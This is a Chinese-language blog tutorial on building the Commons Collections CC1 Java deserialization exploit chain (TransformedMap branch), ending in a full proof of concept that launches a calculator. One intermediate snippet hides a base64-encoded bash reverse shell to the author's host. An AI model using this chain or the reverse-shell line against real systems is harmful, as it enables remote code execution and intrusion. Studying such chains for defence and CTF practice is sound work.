---
date: 2024-06-22
categories:
    - 网络安全
tags: 
    - Java
    - 反序列化
    - CTF
slug: learning-java-cc1-transformedmap
readtime: 15
--- 

# Java学习日志——CC1链-TransformedMap分支小结

> 前置知识：URLDNS 的基本用法和实现，Java 反射调用，Maven 导入 jar 包。

<!-- more -->

上期链接：[Java学习日志——URLDNS小结](https://www.sxrhhh.top/blog/2024/05/12/learning-java-urldns/)

在上期学习完 URLDNS 的内容之后，已经是初步了解到 Java 反序列化的内容。这一次我们进行一条有攻击性可执行任意命令的攻击链 —— CommonCollections1 链，简称 CC1 链。

## 环境搭建

这一条反序列化的攻击链相比于上一条 URLDNS 来说，苛刻了很多。我们在这一次的环境有如下要求：

- jdk 版本 < 8u71
- CommonCollections 版本 < 3.3.0

而开始之前，我们使用 Maven 导入 CommonCollections 的低版本，这里使用的是 3.1。

然后，之所以 jdk 要求小于 `8u71`，是因为修复了我们的一个漏洞使得不太好利用这条链，这个漏洞所属的包是 sun 包，属于内部包，默认安装的 jdk 是没有源码的，这不方便我们的调试和学习。为了清楚的学习如何利用这个漏洞，我们需要下载这部分的源码。

打开下面这个网站[https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4)，这个是漏洞修复前的最后一个源码更改。我们点击这个网页之后，点击左下角的 zip 下载源码包
![](https://repo.sxrhhh.top/undefined20240621234443.png)
然后，下载下来之后解压，通过路径 `src/share/classes/sun` 我们解压复制出 `sun` 这个文件夹，然后在 java 的安装目录下新建一个 `src` 目录，把这个 `sun` 文件夹复制进去，然后进入 IDEA 中，按下 `ctrl + shift + alt + s` 这快捷键打开“项目结构”，选择 SDK, 然后选择 `sun` 文件夹即可。如图：

![](https://repo.sxrhhh.top/undefined20240621235122.png)
![](https://repo.sxrhhh.top/undefined20240621235317.png)

然后，进入 IDEA 验证一下，内部类中的 `sun` 包里的类是不是可以看到 `.java` 文件的源代码了。

我们可以根据网站提示，看一下它的下一个版本的改动。

打开这个连接：[https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d), 可以看到，这次改动修改了 `AnnotationInvocationHandler` 这个类。说明我们之后构造攻击链的一个重点就是这个类。在此先按下不表。

## 初识 Transformer 类

在开始之前，先要了解一下 `Transformer` 这个类。其实这是一个接口。我们打开这个接口文件，可以看到代码只有一行:

```java
public Object transform(Object input);
```

根据注释，可以知道 `Transformer` 这个接口的实现类都有一个核心方法：`transform(Object)` 。它的作用就是，传入一个对象，经过一番处理，然后传出另一个对象。

通过 IDEA 的查找实现类功能，我们发现了这个 `InvokerTransformer` 类。它的 `transform` 方法长这个样子:

```java
public Object transform(Object input) {
    if (input == null) {
        return null;
    }
    try {
        Class cls = input.getClass();
        Method method = cls.getMethod(iMethodName, iParamTypes);
        return method.invoke(input, iArgs);
    // 核心代码到这里就结束了
```

可以看到，这个 `InvokerTransformer` 类里的 `transform` 方法长得就像是后门代码一样，可以执行任意方法。这是个典型的危险方法，也就是我们攻击链的终点。

可以预见的是，CC 链之所以有那么多，多半是和这个 `InvokerTransformer` 这个类可以执行任意方法有关。

## 构造危险 Transformer 对象

我们希望通过 `InvokerTransformer.transform()` 方法来执行危险方法。但是但这一个类肯定还不够。没有什么内部方法莫名其妙地调用这个危险的方法。所以我们需要慢慢构造一个危险的方法。

首先先来看一下一条简单的危险方法如何使用：

```java
Runtime.getRuntime().exec("kcalc");
```

这一行代码，可以执行任意系统命令。也就是说，我调用了 `kcalc` 这个命令，我的电脑上就会弹出一个计算器。如果你是 Windows 电脑，可以把这个字符串换成 `calc` 试试。

但是一行代码还不够，他需要能被反序列化，因此我们需要把 `Runtime` 这个类变成 `Runtime.class`，因为 `Class` 类是可以反序列化的。因此这一行代码就被改写成这样了：

```java
Class c = Runtime.class;
Method getRuntimeMethod = c.getMethod("getRuntime", null);
Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);
r.exec("kcalc");
```

可以看见，我们使用 `c.getMethod` 方法获得了 `getRuntimeMethod` 方法，利用它，我们获取到了 `Runtime` 对象，然后执行了 `exec` 方法。而 `Runtime.class` 本身是可序列化的。

然后我们需要利用 `InvokerTransformer` 类把上面这些步骤改写。因为这个类可以执行任意方法，所以每一句话都可以改写成 `InvokerTransformer` 的形式：

```java
// 第一步，利用 Runtime.class 通过 InvokerTransformer 调用 c.getMethod("getRuntime", null)来获取其中的 getRuntime 方法
Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
// 第二步，利用上一步，调用 getRuntimeMethod.invoke(null, null) 来获取 Runtime 对象
Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
// 第三步，通过调用 r.exec("kcalc") 来调用危险代码
new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"kcalc"}).transform(r);
```

到了这里我们已经是构造了三个 `InvokerTransformer` 对象，只要依次执行他们的 `transform` 方法就可以完成危险方法执行。但是这样并不完美，因为一口气调用三个方法还是比较困难的。这里就需要引出我们的第二个类 —— `ChainedTransformer` 类。这个类最大的用途就是它的内部有一个 `Transformer` 对象的数组。当它执行 `transform` 方法时，它会依次执行数组中前一个 `Transformer` 对象的 `transform` 方法，然后把返回的 `Object` 作为下一个对象的 `transform` 的参数。首尾相连，最后把最后一个对象得到的 `Object` 返回。

利用 `ChainedTransformer` 这个类，我们可以很方便地把三个 `InvokerTransformer` 对象合为一个：

```java
Transformer[] transformers = new Transformer[]{
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwL3d3dy5zeHJoaGgudG9wLzIzMzMgMD4mMQ==}|{base64,-d}|{bash,-i}"}),
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(Runtime.class);
```

到此可以看见，我们的危险 `transformer` 已经创建好了，只要能够调用我们的 `chainedTransformer.transform()` 这个方法，就会执行我们的危险方法。现在这个子弹已经制作完成，我们需要找的就是能把这颗子弹发射出去的一把枪。

## 构造攻击链

在攻击链中，有三个主要节点：入口类、传递方法以及危险方法。如今我们已经把危险方法包装称一个 `chainedTransformer.transform()` 方法，那么我们通过 IDEA 来查找一下有没有什么上级的方法可以作为传递方法。

通过搜索，我们发现了有两个类：`TransformedMap` 和 `LazyMap`。这两个其实正是 CC1 链的两个不同分支，而这一次我们走的是 `TransformedMap` 这个分支。

![](https://repo.sxrhhh.top/undefined20240622013827.png)

我们观察到 `TransformedMap` 这个类，它一共有三个方法，其中两个都是给自己用的 `protected` 方法。而第三个叫做 `checkSetValue` 方法。虽然它也是 `protected` 方法，但是根据它的方法注释我们可以得知，当对这个 Map 执行 `setValue` 方法时，会调用这个方法。我们通过不断跟进它的父类，验证了这个注释是正确的。那么 `setValue` 是什么呢？

我们先来看一下这个 `checkSetValue` 方法做了什么：

```java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

可以看见，这个方法所干的事就是调用对象 `valueTransformer` 成员的 `transform` 方法，那么我们可以根据这个类的源码，来创建一个 `TransformedMap` 对象，令它的 `valueTransformer` 为我们的危险对象。

```java
HashMap<Object, Object> map = new HashMap<>();
map.put("value", "value");
Map<Object, Object> transformedMap = (Map) TransformedMap.decorate(map, null, chainedTransformer);
```

于是我们通过 `decorate` 方法，创建了一个 `transformedMap` 对象。

现在，我们对它调用 `setValue` 方法。这是一个属于 `Map.Entry` 类的方法。它表示了 `Map` 对象中的一个键值对。也就是说，通过 `Map.entrySet()` 可以获得一个以 `Map.EntrySet` 为对象的 `Set` 集合。为了调用这个集合中的对象，我们需要使用迭代器，或者直接使用 foreach 方法就可以。

```java
for(Map.Entry<Object, Object> entry:transformedMap.entrySet()) {
    entry.setValue(Runtime.class);
}
```

这时，我们运行一下代码，发现计算器成功地弹出来了。(记得先要把前面`chainedTransformer.transform(Runtime.class)` 给注释掉，否则可能弹出两个计算器)

现在我们的过渡方法又往前推进了一步。下面我们就需要找到一个类，它有方法调用 `setValue`，最好这个方法直接就是 `readObject` 方法，这样只要把这个类的对象反序列化，就可以调用 `setValue` 方法，进而执行我们的危险方法。

现在我们对着 `setValue` 方法使用 `alt + F7` 查看用法，去找一找有没有合适的方法。这时就要提起我们一开始说的这个 `AnnotationInvocationHandler` 类了。它有一个 `readObject` 方法正好就调用了 `setValue` 。

**如果你的 IDEA 找不到这个类，请重新去看第一节“环境搭建”，那里有说明怎么找到这个类的源码**

![](https://repo.sxrhhh.top/undefined20240622022946.png)

我在这里直接给出这个方法的全部内容：

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    s.defaultReadObject();

    // Check to make sure that types have not evolved incompatibly

    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        // Class is no longer an annotation type; time to punch out
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }

    Map<String, Class<?>> memberTypes = annotationType.memberTypes();

    // If there are annotation members without values, that
    // situation is handled by the invoke method.
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // i.e. member still exists
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) ||
                  value instanceof ExceptionProxy)) {
                memberValue.setValue(
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]").setMember(
                            annotationType.members().get(name)));
            }
        }
    }
}
```

可以看到，当 `AnnotationInvocationHandler` 被反序列化的时候，会对它的 `memberValues` 成员中的元素进行 `setValue` 的调用。也就是说，目前的基本思路就是创建一个 `AnnotationInvocationHandler` 的对象，让它的 `memberValues` 为我们构造好的 `transformedMap` 就可以了。现在先来看一下基本的构造方法。 

```java
Class annotationInvocationHdl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = annotationInvocationHdl.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);    // 让这个无权限的方法可以被调用
Object obj = constructor.newInstance(Target.class, transformedMap);
```

因为 `AnnotationInvocationHandler` 这个类属于 `sun` 包里的内部类，我们不能随便调用，所以我们必须通过反射的方式来调用。通过 `getDeclaredConstructor` 这个方法，我们获取到了这个类的构造方法，然后传入两个参数，第一个为一个 `Annotation` 实现类的 `class` 对象，第二个就是我们的危险 Map 了。


## 最后的调通

现在基本上已经解决了大部分的问题。最后的问题在于：`AnnotationInvocationHandler` 这个类的 `readObject` 方法，想要成功调用 `setValue` 方法，还需要经过两个 if 表达式。我们一个一个解决。

> `memberType != null`

对于这一个，旁边有个注释。根据注释的解释，我们往回看，看到了这两句：

```java
String name = memberValue.getKey();
Class<?> memberType = memberTypes.get(name);
```

结合整个源码来看，这两句话的意思就是说，将 `memberValue` 的 key 值用来获取 `memberType` 的元素。根据前文来看，如果跟进 `AnnotationType` 这个类就会知道，这个 `memberType` 存储的就是我们传入的那个 `Target.class` 的方法名。这个 `Target` ，可以换成其他的 `Annotation` 实现类，但是必须要有方法。比如说 `Overrided` 就不行。

根据上述分析，我们就可以修改一下我们的 `transformedMap` 对象了，因为要保证 `memberType` 不为空。我们看一下 `Target` 的源码，发现它有一个 `value()` 方法。那么我们前面的代码作出这样的更改：

```java
// 注意前面那个 key 值变成了 "value"
map.put("value", "value");
```

> `!(memberType.isInstance(value) || value instanceof ExceptionProxy)`

这个通篇来看，似乎表示的意思是，我们设置的 `transformedMap` 的 value 值是不是属于他的 `annotationType` 或者是 `ExceptionProxy` 类型。我们的 value 值刚开始是被我们设置为 String 类型的，也就是说这个 if 直接过了。

> `setValue` 方法的参数值不可控

由于这个 `setValue` 方法不是由我们控制调用的，所以它填入的参数值我们并不可控，但显然不是我们所希望的。我们希望的是传入一个 `Runtime.class` 给到 `chainedTransformer` 对象的第一个 `InvokerTransformer` 对象。

这时，我们又需要介绍一个新的 `Transformer` 类了，叫做 `ConstantTransformer` 。这个类顾名思义，它存储着一个 `Object` 对象，然后无论它的 `transform` 方法传入了个什么对象，它都会返回同一个对象。这个对象我们是可控的，我们可以让它帮我们传入 `Runtime.class` 参数。现在我们需要修改一下前面的 `chainedTransformer` 所需要的数组：

```java
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"kcalc"}),
};
```

这样一来，我们的 `setValue` 方法就无视任何传参，这个 `chainedTransformer` 永远按照我们的预期运行。

修改之后，我们对 `AnnotationInvocationHandler` 这个对象序列化并反序列化，然后运行，发现成功弹出了计算器。到此，我们的攻击链彻底的构造完成。

## 最终 POC

我在这里放出我最终的 POC

```java
public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
    // 构造 chainedTransformer
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
            new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
            new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"kcalc"}),
    };
    ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

    // 构造 transformedMap
    HashMap<Object, Object> map = new HashMap<>();
    map.put("value", "value");
    Map<Object, Object> transformedMap = (Map) TransformedMap.decorate(map, null, chainedTransformer);

    // 构造 annotationInvocationHandler 然后序列化
    Class annotationInvocationHdl = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor constructor = annotationInvocationHdl.getDeclaredConstructor(Class.class, Map.class);
    constructor.setAccessible(true);
    Object obj = constructor.newInstance(Target.class, transformedMap);

    serialize(obj, "ser.bin");

    // 反序列化，验证成果
    unserialize("ser.bin");
}
```

在这里 `serialize` 和 `unserialize` 两个方法我就不放出来了，总之就是序列化与反序列化。

## 总结

CC1 的 `TransformedMap` 分支也就总结完了，接下来，可以试一下 `LazyMap` 路线，也可以继续别的 CC 链。另外在 ctfshow 上面还有配套题，完事后我可以上传一份题解，就先这样，下次见！
